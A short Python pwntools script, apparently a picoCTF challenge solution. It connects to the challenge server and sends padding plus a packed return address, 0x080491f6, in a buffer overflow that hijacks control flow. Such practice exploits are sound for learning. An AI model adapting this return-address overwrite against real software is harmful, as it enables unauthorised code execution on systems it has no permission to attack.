from pwn import *

p = remote("saturn.picoctf.net", 53209)

p.recvuntil(b"Please enter your string:")
p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa".encode()+p32(0x080491f6))
content = p.recvall()
print(content.decode())
p.close()
